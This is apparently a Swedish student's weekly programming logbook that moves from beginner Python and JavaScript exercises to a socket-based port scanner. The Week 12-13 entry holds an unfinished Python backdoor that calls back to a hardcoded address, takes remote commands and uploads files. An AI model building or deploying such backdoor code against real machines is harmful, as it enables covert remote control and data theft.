# Programmering
Loggbok 
=========================

### Vecka 20
----------------
Gjorde:
### Fullständig implementation och testning av portscannern
Fil: portscanner.py

Exempel:

\`\`\`python
import socket

def skanna_mal(mal, antal_portar):
    print(f"\nBörjar skanna för {mal}")
    for port in range(1, antal_portar + 1):
        skanna_port(mal, port)

def skanna_port(ip_adress, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            resultat = sock.connect_ex((ip_adress, port))
            if resultat == 0:
                print(f"[+] Port {port} är öppen")
    except Exception as e:
        print(f"Fel: {e}")

mal_lista = input("[] Ange mål att skanna (separera med kommatecken): ").strip().split(',')
antal_portar = int(input("[] Ange antal portar du vill skanna: "))

print("[*] Skannar flera mål")
for mal in mal_lista:
    skanna_mal(mal.strip(), antal_portar)
\`\`\`

Lärdomar:
Jag har lärt mig att skriva en fullständig och fungerande portscanner i Python, inklusive att hantera undantag och optimera skanningslogiken. Detta inkluderar djupare förståelse för socket-programmering och nätverkskommunikation i Python. Projektet gav också praktisk erfarenhet av att testa och felsöka nätverksprogram.

---

### Vecka 19
----------------
Gjorde:
### Implementering av funktionsbaserad skanning
Fil: portscanner.py

Exempel:

\`\`\`python
def skanna_port(ip_adress, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            resultat = sock.connect_ex((ip_adress, port))
            if resultat == 0:
                print(f"[+] Port {port} är öppen")
    except Exception as e:
        print(f"Fel: {e}")
\`\`\`

Lärdomar:
Jag har fokuserat på att dela upp koden i funktioner för att förbättra dess struktur och återanvändbarhet. Specifikt har jag lärt mig hur man använder try-except block för att hantera undantag och fel som kan uppstå under nätverkskommunikation.

---

### Vecka 18
----------------
Gjorde:
### Hantering av flera mål för skanning
Fil: portscanner.py

Exempel:

\`\`\`python
mal_lista = input("[] Ange mål att skanna (separera med kommatecken): ").strip().split(',')
antal_portar = int(input("[] Ange antal portar du vill skanna: "))

print("[*] Skannar flera mål")
for mal in mal_lista:
    skanna_mal(mal.strip(), antal_portar)
\`\`\`

Lärdomar:
Jag har lärt mig hur man hanterar flera mål för skanning genom att ta input från användaren och iterera över en lista med mål. Detta innebar att förbättra mina färdigheter i att hantera användarinmatning och strängmanipulering i Python.

---

### Vecka 17
----------------
Gjorde:
### Grundläggande portskanning
Fil: portscanner.py

Exempel:

\`\`\`python
import socket

def skanna_mal(mal, antal_portar):
    print(f"\nBörjar skanna för {mal}")
    for port in range(1, antal_portar + 1):
        skanna_port(mal, port)
\`\`\`

Lärdomar:
Jag har lärt mig grunderna i att använda Python's socket-modul för att skapa en enkel portscanner. Specifikt har jag förstått hur man öppnar och stänger socketar samt hur man kontrollerar om en port är öppen eller stängd på en viss IP-adress.

---

### Vecka 16
----------------
Gjorde:
### Förberedelser och planering
Fil: planering.md

Exempel:

\`\`\`markdown
# Planering för Portscanner Projekt

## Mål:
- Skapa en funktionell portscanner i Python
- Lära mig grunderna i nätverksprogrammering med socket-modulen

## Steg:
1. Lära mig grundläggande nätverkskoncept och socket-programmering
2. Implementera grundläggande portskanning
3. Utöka med hantering av flera mål
4. Testa och optimera koden
\`\`\`

Lärdomar:
Jag har fokuserat på att planera projektet och identifiera de steg som krävs för att slutföra det. Detta inkluderade att sätta upp mål och delmål samt att skapa en tidsplan för att säkerställa att projektet slutförs i tid.

---

### Vecka 15
----------------
Gjorde:
### Utforskning av socket-programmering
Fil: socket_experiment.py

Exempel:

\`\`\`python
import socket

# Skapa en socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Anslut till en server
sock.connect(('example.com', 80))

# Skicka en HTTP-förfrågan
sock.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")

# Ta emot svar
response = sock.recv(4096)
print(response)

# Stäng socketen
sock.close()
\`\`\`

Lärdomar:
Jag har utforskat grunderna i socket-programmering genom att skapa en enkel klient som ansluter till en webbserver, skickar en HTTP-förfrågan och tar emot ett svar. Detta hjälpte mig att förstå hur socketar fungerar och hur de kan användas för nätverkskommunikation.

---

### Vecka 14
----------------
Gjorde:
Här bestämde jag mig att skita i bakdorren för att det behöver ett server eller en virtual machine för att testa och det är svårt att visa upp det till Rikard. Men jag har faktiskt fixade klart det. Men nu börjar jag med portscanner.
### Inledande forskning och planering
Fil: research_notes.md

Exempel:

\`\`\`markdown
# Forskning om Portscanners

## Vad är en portscanner?
En portscanner är ett verktyg som används för att skanna en värddators nätverksportar och identifiera vilka portar som är öppna och kan ta emot anslutningar.

## Vanliga verktyg:
- Nmap
- Netcat

## Mål för projektet:
- Förstå hur portscanning fungerar
- Skapa en enkel portscanner i Python
\`\`\`

Lärdomar:
Jag har genomfört inledande forskning om portscanners och deras användning. Detta inkluderade att läsa om olika portscanner-verktyg som Nmap och Netcat samt att förstå de grundläggande koncepten bakom portscanning.



Vecka 14
----------------
Gjorde: Påsklovet


Vecka 12-13
----------------
Gjorde: (absolut inte färdig kod än)
~~~

import socket
import time
import subprocess
import json
import os

def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.1.12',5555))
			shell()
			s.close()
			break
		except:
			connection()

def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())


def download_file(file_name):
        f = open(file_name, 'wb')

def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
~~~

Jag började lära mig hur man skapar en enkel bakdörr i Python för att kommunicera med fjärrdatorer över nätverket. Genom att använda sockets kan jag skicka och ta emot data, vilket gör att jag kan utföra olika kommandon på den anslutna datorn.

Vecka 11
----------------
Gjorde: (Inte färdig kod än)
~~~
import socket

def scan(target, ports):
    for port in range (1,ports):
        scan_port(target,port)
def scan_port(ipaddress, port):
    try:
        sock = socket.socket()
        sock.connect((ipaddress, port))
        print("The Port is Open " + str(port))
        sock.close()
    except:
        print("The Port is Closed" + str(port))

target = input("Enter Target To Scan: ")
ports = input("Enter How Many Ports You Want To Scan: ")
~~~

Jag har börjat lära mig hur man skapar en portscanner i Python. Genom att använda socket-modulen kan jag skanna önskade IP-adresser och portar för att identifiera öppna portar och eventuella sårbarheter i nätverket.

Vecka 10
----------------
Gjorde:

~~~
import time

print("Väntar i 5 sekunder...")
time.sleep(5)
print("Klart!")
~~~

Jag har lärt mig att använda modulen `time` för att skapa fördröjningar eller väntetider i Python-program.


Vecka 9
----------------
Gjorde:

~~~
import json

data = {'name': 'John', 'age': 30, 'city': 'New York'}
json_data = json.dumps(data)
print(json_data)
~~~

Jag har lärt mig att konvertera Python-dictionaryn till JSON-format med hjälp av modulen `json`.

Vecka 8
----------------
Gjorde:

~~~
import subprocess

subprocess.run(['ls', '-l'])
~~~

Jag har börjat använda modulen `subprocess` för att köra externa kommandon och program från Python.


Vecka 6
----------------
Gjorde:

~~~
import os

file_path = '/home/user/Documents/example.txt'
if os.path.exists(file_path):
    os.remove(file_path)
    print("Filen har raderats.")
else:
    print("Filen finns inte.")

~~~

Jag har lärt mig att använda modulen `os` för att hantera filer och mappar i Python, inklusive att radera filer.

Vecka 5
----------------
Gjorde:

~~~
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.12', 5555))
s.send(b'Hello server!')
data = s.recv(1024)
print('Received:', data.decode())
s.close()
~~~

Jag har börjat utforska socket-programmering i Python och lärt mig att skicka och ta emot data över ett nätverk.


Vecka 4
----------------
Gjorde:

~~~
import random

def shuffle_list(my_list):
    random.shuffle(my_list)
    return my_list

my_list = [1, 2, 3, 4, 5]
print("Blandad lista:", shuffle_list(my_list))
~~~

Jag har lärt mig att blanda ordningen på element i en lista med hjälp av random-modulen.

Vecka 3
----------------
Gjorde:

~~~
import random

def generate_password():
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()"
    length = 12
    password = "".join(random.sample(characters, length))
    return password

print("Genererat lösenord:", generate_password())
~~~

Jag har lärt mig att skapa slumpmässiga lösenord av olika längder med hjälp av JavaScript, men ändå började jag fokusera igen på python för att jag tycker att mitt projekt som jag vill göra kommer var skriven i Python, det känns svårt att hinna gör en bra medel-avancerad projekt med javascript.

Vecka 2
----------------
Gjorde:

~~~
import random

def guess_number():
    number = random.randint(1, 100)
    guess = int(input("Gissa ett nummer mellan 1 och 100: "))
    if guess == number:
        print("Grattis, du har gissat rätt!")
    else:
        print(f"Tyvärr, det rätta numret var {number}.")

guess_number()
~~~

Jag har fortsatt lära mig grundläggande JavaScript genom att skapa ett enkelt nummergissningsspel. Fast där stuttade jag på massa nya saker och det fanns så många saker som inte fungerade för mig och då försökte jag att översätta den python kod som ligger övanför till javascript kod och jag kom på följande: 

~~~
function guessNumber() {
    const readline = require('readline');
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const number = Math.floor(Math.random() * 100) + 1;

    rl.question('Gissa ett nummer mellan 1 och 100: ', (answer) => {
        const guess = parseInt(answer);
        if (guess === number) {
            console.log("Grattis, du har gissat rätt!");
        } else {
            console.log(`Tyvärr, det rätta numret var ${number}.`);
        }
        rl.close();
    });
}

guessNumber();

~~~
Denna koden funkar inte riktigt för mig heller, tog lite hjälp från ChatGPT och det hjälpte inte så myckte riktigt heller men försökte i alla fall. 


Vecka 50
----------------
Gjorde:

~~~
function kastaTarning() {
    return Math.floor(Math.random() * 6) + 1;
}

let tarningskast;
do {
    tarningskast = Array.from({ length: 5 }, kastaTarning);
    if (tarningskast.every(tarning => tarning === tarningskast[0])) {
        console.log("Yatzy");
    } else {
        console.log("Inte Yatzy");
    }
} while (!tarningskast.every(tarning => tarning === tarningskast[0]));

~~~

Jag har lärt mig grunderna i JavaScript och hur man kan använda slumpmässiga tal och villkor för att skapa ett enkelt tärningsspel. I detta exempel så loppar koden till jag får Yatzy.


Vecka 49
----------------
Gjorde:
### Började bestämma över projektet

på måndagen så bestämmde jag att jag ska göra en miniräknare som ett litet projekt för att jag tycker att det var intressant. Jag kollade på flera YouTube videor som visar tänkesätt när man ska skapa en miniräknare med hjälp av Python. 

Vecka 48
----------------
Gjorde:
### klarade alla test 

på måndagen så repeterade jag allt som vi gick igenom, fokuserade mest på att definiera funktioner. Att kunna läsa och förstå def funktioner hade jag nästan inga problem alls. Men att definera funktioner själv var lite jobbigt så jag jobbade med det nästan hela lektionen. På torsdagen så gjorde jag alla test som var kvar och klarade alla, jag skrev i loggboken under lektionen också. Jag installerade VSCodium på min ny dator som jag fick så jag kunde inte programmera under denna lektionen. 


Vecka 47
----------------
Gjorde:
### 7080 definiera funktioner (bara som en test för att förstå hur koden fungerar)

Jag började med att definera funktioner på måndagen. Jag skrev ingen unik kod. På torsdagen hade Jag resursdag hela dagen. 


Vecka 46
----------------
Gjorde:
### har gjort alla prov som jag missade/gick dåligt. 

Exempel: ingen exempel, jag har tränat på gamla exempel och testade små koder som behöver inte nämnas, bara för att memorera allt inför provet. Jag löste alla exempeltest som Rikard har lagt ut så att jag förstå hur ungefär provet kommer att se ut. 


Vecka 45
----------------
Gjorde:
### 7100 listor ( 7100 A och B 5 yatzy )
Fil: 7100 A 5 yatzy
     7100 B 5 yatzy

Exempel: ligger ovan i vecka 43. 

Vecka 44
----------------
Gjorde:
höstlov.


Vecka 43-45
----------------
Gjorde:
### 7100 listor ( 7100 A och B 5 yatzy )
Fil: 7100 A 5 yatzy
     7100 B 5 yatzy

Exempel:

~~~

import random
def kasta_tärning():
    return random.randint(1, 6)
tärningskast = [kasta_tärning() for _ in range(5)]
if all(tärning == tärningskast[0] for tärning in tärningskast):
    print("Yatzy")
else:
    print("Inte Yatzy")


~~~

~~~
import random

def kasta_tärning():
    return random.randint(1, 6)
tärningskast = [kasta_tärning() for _ in range(5)]
antalet_ettor = tärningskast.count(1)
print(f"Antalet ettor är: {antalet_ettor}")

~~~

Jag har lärt mig hur man använder listor och loopar i Python för att hantera data och utföra olika operationer.
Exempelvis hur man skapar och manipulerar listor i Python för att organisera och analysera data. Jag har även sett hur man kan använda loopar och villkor för att utföra olika åtgärder baserat på data i listor. Jag försökte också att lärt mig att skapa och använda funktioner för att göra koden mer strukturerad och återanvändbar. 

Ingenting var svårt denna gången, det var enklare än förra uppgiften (Primtal uppgift)

Vecka 41-42 
----------------
Gjorde:
### 7100 listor
Fil: 7100 listor.py

Exempel:

~~~
import random

# Kasta en sexsidig tärning 10 gånger och spara resultaten i en lista
resultat_lista = [random.randint(1, 6) for _ in range(10)]
resultat_lista.sort()
summa = sum(resultat_lista)
medelvärde = summa / len(resultat_lista)
minsta = min(resultat_lista)
största = max(resultat_lista)
antalet_sexor = resultat_lista.count(6)
vanligaste_valören = max(set(resultat_lista), key = resultat_lista.count)

# Skriv ut resultaten
print("Resultat:", resultat_lista)
print("Sorterat:", resultat_lista)
print("Summa:", summa)
print("Medelvärde:", medelvärde)
print("Minsta:", minsta)
print("Största:", största)
print("Antal sexor:", antalet_sexor)
print("Vanligast:", vanligaste_valören)

~~~

Jag har lärt mig hur man kan använda listor i Python för att spara och hantera resultat. Listor var mycket storre och bredare än vad jag trode innan jag börjar jobba med dem, de kan exempelvis användas för att samla data, som i det här fallet de olika tärningskasten. Jag har även lärt mig hur man kan använda loopar, som en for-loop, för att upprepa en handling flera gånger. I det här exemplet har jag använt en lista för att spara resultaten av tärningskasten, sedan sorterades listan och beräknades summan och medelvärdet.


vecka 39-40
--------------
gjorde 
### 7073 flödesdiagram 
Fil: 7073 flödesdiagram.py

jag kan inte klistra in flödesdiagram här, men koden har jag skrivit. 
exempel :

~~~

'''
tal = int(input("Mata in ett tal: "))

if tal < 0:
    print("Tal mindre än 0 är negativa.")
elif 0 <= tal <= 9:
    print("Det är ensiffriga tal.")
elif 10 <= tal <= 99:
    print("Det är tvåsiffriga tal.")
elif 100 <= tal <= 999:
    print("Det är tresiffriga tal.")
else:
    print("Det är minst fyrsiffriga tal.")
'''
'''
gissning = int(input("Gissa ett tal: "))
while gissning != 4:
    print("Du gissade fel. Gissa på ett annat tal.")
    gissning = int(input("Gissa ett tal: "))
print("Du gissade rätt.")
'''
'''
tal = int(input("Ange ett tal: "))
antal_gissningar = 0
while tal != 42:
    antal_gissningar += 1
    if tal < 42:
        print("För litet")
    elif tal > 42:
        print("För stort")
    tal = int(input("Ange ett tal: "))
print(f"Du behövde {antal_gissningar} gissningar för att hitta rätt svar.")
'''
import random

def sten_sax_pase():
    spelare = input("Välj sten, sax eller påse: ").lower()
    datorn = random.choice(["sten", "sax", "påse"])

    print(f"Datorn valde: {datorn}")

    if spelare == datorn:
        print("Oavgjort!")
    elif spelare == "sten":
        if datorn == "sax":
            print("Spelaren vinner!")
        else:
            print("Datorn vinner!")
    elif spelare == "sax":
        if datorn == "sten":
            print("Datorn vinner!")
        else:
            print("Spelaren vinner!")
    elif spelare == "påse":
        if datorn == "sten":
            print("Spelaren vinner!")
        else:
            print("Datorn vinner!")
    else:
        print("Ogiltigt val. Försök igen.")

while True:
    sten_sax_pase()
    fortsatt = input("Vill du spela igen? (ja/nej): ").lower()
    if fortsatt != "ja":
        break

print("Tack för att du spelade!!")

~~~

Gick riktigt bra.
Har rittat olika flödesdiagram till alla kod som ligger där uppe, ganska enkelt att göra så och man ska använda det innan man börja programmera något projekt, så skulle jag göra i alla fall. While True och att definera, som i detta fall def sten_sax_pase(): är något nytt som jag har lärt mig, .lower också men det var ganska enkelt. 






23 09 21 
----------------
Gjorde:
### 7070 slumptal
Fil: 7070 slumptal.py

Exempel:

import random

saldo = 0

print("Välkommen att kasta tärning")
print("Ett spel kostar 1 krona")
print("Vinstplan:")
print("två lika - 3 kr")
print("en sexa - 5 kr")
print("stege - 1 kr")

while True:
    val = input("Välj spela (s), sätt in pengar (i), eller avsluta (a): ")

    if val == 'a':
        print("Vad roligt att du spelade en stund!")
        break
    elif val == 'i':
        insattning = int(input("Ange belopp att sätta in: "))
        saldo += insattning
        print(f"Att spela för: {saldo}")
    elif val == 's':
        if saldo < 1:
            print("Du har inte tillräckligt med pengar.")
        else:
            saldo -= 1
            tarning1 = random.randint(1, 6)
            tarning2 = random.randint(1, 6)

            print(tarning1, tarning2)

            if tarning1 == 6 or tarning2 == 6:
                print("sex-vinst + 5kr")
                saldo += 5
            elif tarning1 == tarning2:
                print("två lika + 3 kr")
                saldo += 3
            elif (tarning1 == 1 and tarning2 == 2) or (tarning1 == 2 and tarning2 == 1):
                print("steg-vinst + 1kr")
                saldo += 1
            else:
                print("förlust")

            print(f"Att spela för: {saldo}")

Gick riktigt bra.
Jag har lärt mig många olika saker denna gången, har lärt mig skillnaden mellan vanligt print() och print(f "" ). Att importera random är också en ny sak för mig, men det
väldigt enkelt. Att använda variabel och ge den ett värde som kan ändras på grund av outputen är också väldigt spännande, som i den här gången var {saldo}. 






























